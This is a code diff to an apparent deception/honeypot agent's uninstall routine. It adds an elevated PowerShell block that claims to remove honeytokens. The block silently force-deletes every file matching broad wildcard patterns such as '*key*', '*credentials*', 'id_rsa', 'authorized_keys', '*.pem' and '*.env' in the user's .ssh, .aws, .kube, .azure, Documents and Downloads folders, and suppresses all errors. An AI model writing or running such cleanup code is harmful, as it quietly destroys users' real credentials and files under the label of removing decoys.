@@ -158,7 +158,7 @@ class DeceptionAgent:
         system = platform.system().lower()
 
         if system == "windows":
-            # PowerShell script with elevation to delete task and folder
+            # PowerShell script with elevation to delete task, folder, and honeytokens
             ps_script = f"""
 $ErrorActionPreference = 'SilentlyContinue'
 
@@ -176,6 +176,34 @@ Start-Sleep -Seconds 2
 
 # Delete installation directory
 Remove-Item -Path "{install_dir}" -Recurse -Force -ErrorAction SilentlyContinue
+
+# Delete deployed honeytokens from strategic locations
+$home = [Environment]::GetFolderPath('UserProfile')
+$honeytoken_locations = @(
+    "$home\\Documents",
+    "$home\\.aws",
+    "$home\\.ssh",
+    "$home\\.docker",
+    "$home\\.kube",
+    "$home\\.azure",
+    "$home\\Downloads"
+)
+
+# Files to remove (honeytokens)
+$honeytoken_files = @(
+    '*aws*', '*credentials*', '*secrets*', '*password*', '*token*', '*key*',
+    '*db_*', '*database*', '*mysql*', '*postgres*', '*mongodb*',
+    '*id_rsa*', '*id_ed25519*', '*authorized_keys*', '*.pem', '*.key',
+    '*kubeconfig*', '*kube_config*', '*.env'
+)
+
+foreach ($location in $honeytoken_locations) {{
+    if (Test-Path $location) {{
+        foreach ($pattern in $honeytoken_files) {{
+            Get-ChildItem -Path $location -Filter $pattern -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        }}
+    }}
+}}
 
 exit
 """
